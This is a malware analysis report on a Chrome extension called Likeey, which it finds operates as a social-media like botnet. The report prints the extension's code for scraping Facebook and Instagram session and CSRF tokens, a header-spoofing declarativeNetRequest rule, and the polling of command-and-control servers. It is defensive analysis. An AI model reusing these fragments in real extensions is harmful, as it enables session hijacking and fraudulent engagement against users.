# Vulnerability Report: Likeey

## Metadata
- **Extension ID**: ffadpiabilbnjbgcemdndlkikhmnniel
- **Extension Name**: Likeey
- **Version**: 4.3
- **Users**: Unknown
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-15

## Executive Summary

Likeey is a malicious Chrome extension that operates as part of a social media automation botnet. The extension automatically performs likes and reactions on Instagram and Facebook posts by extracting session tokens, CSRF tokens, and authentication credentials from the user's browser session. It communicates with remote command-and-control servers (likeeey.biz, likeboost.net) to receive "orders" specifying which posts to like, effectively turning users into unwitting participants in a like-exchange or engagement manipulation scheme. The extension uses declarativeNetRequest rules to manipulate HTTP headers and bypass security controls.

The extension represents a critical security threat as it performs unauthorized actions on behalf of users, exfiltrates sensitive authentication data, and operates as part of a distributed botnet infrastructure. Users who install this extension unknowingly grant attackers persistent access to their social media accounts.

## Vulnerability Details

### 1. CRITICAL: Automated Social Media Account Hijacking

**Severity**: CRITICAL
**Files**: background.js (lines 815-1065, 1275-1483)
**CWE**: CWE-306 (Missing Authentication for Critical Function), CWE-352 (Cross-Site Request Forgery)
**Description**: The extension implements two complete automation classes (`Lr` for Facebook, `kr` for Instagram) that extract authentication credentials from web pages and automatically perform likes/reactions without user consent.

**Evidence**:

```javascript
// Facebook automation (Lr class)
static getProperOrder() {
  let t = rt.getOrderUri("getProperOrder/" + e.id + "/true"),
      r = yield(yield fetch(t)).json();
  Object.keys(r).length > 0 ? (br(r.scheduledMinute), yield new Lr(r).execute())
}

// Instagram automation (kr class)
static getProperOrder() {
  let t = rt.getOrderUri("getProperOrder/" + e.profileData.id + "/false"),
      r = yield(yield fetch(t)).json();
  yield new kr(r).execute()
}
```

The `Lr.sendLike()` method (lines 1011-1048) constructs Facebook GraphQL API requests with extracted tokens:

```javascript
sendLike() {
  n.append("fb_dtsg", t.likeParams.fb_dtsg)
  n.append("lsd", t.likeParams.lsd)
  n.append("variables", JSON.stringify(t.likeParams.variables))
  let l = yield fetch("https://www.facebook.com/api/graphql/", {
    headers: r,
    body: decodeURI(n.toString()),
    method: "POST",
    credentials: "include"
  })
}
```

**Verdict**: This is unambiguous malicious behavior. The extension performs actions on social media platforms without user knowledge or consent, extracting session credentials to automate engagement.

### 2. CRITICAL: Session Token and Credential Extraction

**Severity**: CRITICAL
**Files**: background.js (lines 816-985, 1294-1483)
**CWE**: CWE-200 (Exposure of Sensitive Information), CWE-522 (Insufficiently Protected Credentials)
**Description**: The extension extracts numerous authentication tokens, session identifiers, and anti-CSRF tokens from Instagram and Facebook web pages through regex parsing and DOM scraping.

**Evidence**:

Facebook token extraction (lines 936-984):
```javascript
t.likeParams.accountId = r.split('"ACCOUNT_ID":"')[1].split('",')[0]
t.likeParams.__a = r.split("?__a=")[1].split("&")[0]
t.likeParams.__req = vt.generate()
t.likeParams.__hs = r.split('"haste_session":"')[1].split('"')[0]
t.likeParams.__ccg = r.split('"connectionClass":"')[1].split('"')[0]
t.likeParams.__rev = r.split('{"consistency":{"rev":')[1].split("}")[0]
t.likeParams.fb_dtsg = r.split('["DTSGInitialData",[],{"token":"')[1].split('"')[0]
t.likeParams.jazoest = r.split("jazoest=")[1].split('",')[0]
t.likeParams.lsd = r.split('["LSD",[],{"token":"')[1].split('"')[0]
```

Instagram token extraction (lines 1355-1399):
```javascript
let l = t.split('"csrf_token":"')[1].split('"')[0]
let f = t.split('"appId":"')[1].split('"')[0]
let g = t.split('"userID":"')[1].split('"')[0]
let u = t.split('"X-IG-D":"')[1].split('"')[0]
let m = t.split('"haste_session":"')[1].split('"')[0]
```

**Verdict**: This constitutes credential theft. The extension systematically extracts authentication tokens that should remain browser-internal and uses them to perform unauthorized API requests.

### 3. CRITICAL: HTTP Header Manipulation to Bypass Security Controls

**Severity**: CRITICAL
**Files**: rules.json (lines 1-177)
**CWE**: CWE-346 (Origin Validation Error)
**Description**: The extension uses declarativeNetRequest rules to modify security-critical HTTP headers including `origin`, `sec-fetch-site`, `sec-fetch-mode`, and `sec-fetch-dest` to make requests appear as same-origin.

**Evidence**:

```json
{
  "id": 1,
  "action": {
    "type": "modifyHeaders",
    "requestHeaders": [
      {"header": "origin", "operation": "set", "value": "https://www.instagram.com"},
      {"header": "sec-fetch-site", "operation": "set", "value": "none"},
      {"header": "sec-fetch-mode", "operation": "set", "value": "navigate"},
      {"header": "sec-fetch-dest", "operation": "set", "value": "document"}
    ]
  },
  "condition": {
    "urlFilter": "||instagram.com/",
    "resourceTypes": ["xmlhttprequest"]
  }
}
```

This falsifies the origin of requests to Instagram and Facebook APIs, making background extension requests appear to come from legitimate user navigation. This defeats CORS and CSRF protections.

**Verdict**: Intentional security control bypass. The extension manipulates headers specifically designed to prevent cross-origin attacks, enabling it to perform authenticated requests that would normally be blocked.

### 4. HIGH: Command-and-Control Infrastructure for Botnet Operations

**Severity**: HIGH
**Files**: background.js (lines 652-689, 3899-3926)
**CWE**: CWE-912 (Hidden Functionality)
**Description**: The extension operates as a botnet client, periodically polling remote servers for "orders" specifying which posts to like. It implements periodic alarms and maintains persistent communication with C2 infrastructure.

**Evidence**:

```javascript
class rt {
  static defaults = {
    orderUri: new URL("https://order.likeeey.biz"),
    apiUri: new URL("https://api.likeeey.biz")
  }
  static getOrderUri(t) {
    return `${this.defaults.orderUri.origin}/${t}`
  }
}

// Periodic polling for orders
function Tr() {
  let e = yield lt.getUserData()
  if (e.loggedIn == it.TRUE) {
    let t = rt.getOrderUri("getProperOrder/" + e.profileData.id + "/false")
    let r = yield(yield fetch(t)).json()
    Object.keys(r).length > 0 ? yield new kr(r).execute()
  }
}

// Alarm-based scheduling
chrome.alarms.create("alarmInsta", {periodInMinutes: e})
chrome.alarms.onAlarm.addListener(function(e) {
  "alarmInsta" === e.name && Tr()
})
```

Debug endpoint reveals alternate C2 domain:
```javascript
fetch("https://order2.likeboost.net/debug?key=" + n.debug)
```

**Verdict**: This is botnet infrastructure. The extension receives commands from remote servers specifying targets, executes those commands, and reports back with status updates (START_COUNTER, ORDER_END messages).

## False Positives Analysis

None. This extension's stated purpose is "like exchange," which means it is explicitly designed to perform automated engagement manipulation. However, this does not make the behavior legitimate:

1. The description does not disclose that the extension extracts authentication credentials
2. Users are not informed that their accounts will automatically like content without their explicit approval for each action
3. The header manipulation and token extraction go far beyond what would be necessary for a legitimate automation tool
4. The C2 infrastructure indicates this is part of a coordinated botnet operation, not individual user automation

## API Endpoints Analysis

| Endpoint | Purpose | Data Sent | Risk |
|----------|---------|-----------|------|
| order.likeeey.biz/getProperOrder/{userId}/{isFacebook} | Receive automation commands | User ID, platform identifier | CRITICAL - C2 communication |
| api.likeeey.biz/fOrderHandler | Report order status | Order status, like counts | HIGH - Exfiltrates activity data |
| api.likeeey.biz/collectCredit | Claim credits for performed actions | User ID | HIGH - Botnet accounting |
| order2.likeboost.net/debug | Debug/alternate C2 endpoint | Debug key | HIGH - Backup C2 infrastructure |
| www.likeeey.biz/install/ | Installation tracking | Unknown | MEDIUM - User tracking |
| www.facebook.com/api/graphql/ | Perform automated likes | All extracted tokens, target post IDs | CRITICAL - Unauthorized API access |
| www.instagram.com/graphql/query | Perform automated likes | All extracted tokens, target post IDs | CRITICAL - Unauthorized API access |

## Overall Risk Assessment

**RISK LEVEL: CRITICAL**

**Justification**:

This extension is unambiguously malicious software operating as part of a social media engagement manipulation botnet. It performs the following critical security violations:

1. **Account Hijacking**: Automatically performs actions (likes/reactions) on Instagram and Facebook without user consent for each specific action
2. **Credential Theft**: Extracts session tokens, CSRF tokens, authentication identifiers, and other sensitive credentials through HTML parsing
3. **Security Control Bypass**: Manipulates HTTP security headers (origin, sec-fetch-*) to defeat CORS and CSRF protections
4. **Botnet Operation**: Operates as a distributed botnet client, receiving commands from remote C2 servers and executing automated engagement campaigns
5. **Data Exfiltration**: Sends user IDs, activity metrics, and operational status back to attacker-controlled infrastructure

The extension grants attackers persistent, automated access to users' social media accounts. Even though the description mentions "like exchange," the technical implementation reveals:
- No per-action user consent
- Hidden credential extraction beyond what any legitimate tool would require
- Active security control bypass through header manipulation
- Integration with C2 infrastructure for coordinated botnet operations

Users installing this extension become unwitting participants in social media manipulation campaigns while their accounts are used to generate fraudulent engagement metrics. This violates Instagram and Facebook Terms of Service and could result in account bans for users.

**Recommendation**: This extension should be immediately removed from the Chrome Web Store and reported to Google's abuse team. Users who have installed it should revoke their Instagram and Facebook sessions and check for unauthorized account activity.
